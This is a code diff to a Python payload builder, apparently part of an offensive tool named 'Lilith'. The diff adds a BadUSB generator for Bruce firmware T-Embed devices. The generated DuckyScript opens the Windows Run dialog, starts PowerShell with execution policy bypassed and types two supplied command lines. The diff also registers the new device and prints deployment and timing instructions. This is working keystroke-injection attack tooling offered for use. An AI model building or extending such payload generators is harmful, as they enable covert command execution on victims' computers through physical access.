@@ -64,6 +64,33 @@ def _duck(line1: str, line2: str, boot_ms: int) -> str:
     ])
 
 
+def _teembed(line1: str, line2: str, boot_ms: int) -> str:
+    """DuckyScript 1.0 for Bruce firmware BadUSB (T-Embed Plus / M5StickC / compatible).
+
+    Deploy: copy to /BadUSB/lilith_badusb.txt on the SD card
+    Run   : Bruce menu → BadUSB → lilith_badusb.txt → Run
+    """
+    return "\n".join([
+        "REM Lilith BadUSB — Bruce firmware (T-Embed Plus)",
+        "REM Deploy: /BadUSB/lilith_badusb.txt on SD card",
+        "REM Run: Bruce → BadUSB → lilith_badusb.txt",
+        f"DELAY {boot_ms}",
+        "GUI r",
+        f"DELAY {_DIALOG_MS}",
+        "STRING powershell -ep bypass",
+        "ENTER",
+        f"DELAY {_PS_READY_MS}",
+        f"STRING {line1}",
+        "ENTER",
+        f"DELAY {_LINE_MS}",
+        f"STRING {line2}",
+        "ENTER",
+        f"DELAY {_EXIT_MS}",
+        "STRING exit",
+        "ENTER",
+    ])
+
+
 def _pico(line1: str, line2: str, boot_ms: int) -> str:
     """CircuitPython code.py for Raspberry Pi Pico / Pico W / Pico Zero.
 
@@ -148,18 +175,20 @@ def _digispark(line1: str, line2: str, boot_ms: int) -> str:
 
 # ── public API ────────────────────────────────────────────────────────────────
 
-DEVICES = ("duck", "pico", "digispark")
+DEVICES = ("duck", "pico", "digispark", "teembed")
 
 _FILENAMES = {
-    "duck":      ("payload.txt",         "copy to /payload.txt on Rubber Ducky SD card"),
-    "pico":      ("code.py",             "copy to / on CircuitPython drive (overwrite code.py)"),
-    "digispark": ("payload_digispark.ino", "open in Arduino IDE → board: Digispark 16.5MHz → upload"),
+    "duck":      ("payload.txt",            "copy to /payload.txt on Rubber Ducky SD card"),
+    "pico":      ("code.py",                "copy to / on CircuitPython drive (overwrite code.py)"),
+    "digispark": ("payload_digispark.ino",  "open in Arduino IDE → board: Digispark 16.5MHz → upload"),
+    "teembed":   ("lilith_badusb.txt",      "copy to /BadUSB/lilith_badusb.txt on SD card → Bruce → BadUSB → run"),
 }
 
 _GENERATORS = {
     "duck":      _duck,
     "pico":      _pico,
     "digispark": _digispark,
+    "teembed":   _teembed,
 }
 
 
@@ -195,7 +224,8 @@ def build_usb_payload(
 
     for dev in targets:
         if dev not in _GENERATORS:
-            print(f"[!] Unknown device '{dev}'  (valid: duck, pico, digispark, all)")
+            valid = " | ".join(DEVICES)
+            print(f"[!] Unknown device '{dev}'  (valid: {valid} | all)")
             continue
 
         content  = _GENERATORS[dev](line1, line2, boot_delay_ms)
@@ -213,8 +243,9 @@ def build_usb_payload(
         line2_chars = len(line2)
         digi_est    = round(line2_chars / 100)
         print(f"\n[*] Execution time estimate")
-        print(f"    Duck / Pico : ~{(_BOOT_MS + _DIALOG_MS + _PS_READY_MS + _EXIT_MS) // 1000 + 2}s total")
-        print(f"    DigiSpark   : ~{(_BOOT_MS + _DIALOG_MS + _PS_READY_MS + _EXIT_MS) // 1000 + digi_est}s total  (line 2 = {line2_chars} chars @ ~100 c/s)")
+        base_s = (_BOOT_MS + _DIALOG_MS + _PS_READY_MS + _EXIT_MS) // 1000 + 2
+        print(f"    Duck / Pico / T-Embed : ~{base_s}s total")
+        print(f"    DigiSpark             : ~{base_s + digi_est}s total  (line 2 = {line2_chars} chars @ ~100 c/s)")
         print(f"    Boot delay  : {boot_delay_ms}ms  (use --usb-boot-delay to tune)")
         print(f"    Layout      : US  — non-US targets will mistype special chars")
 
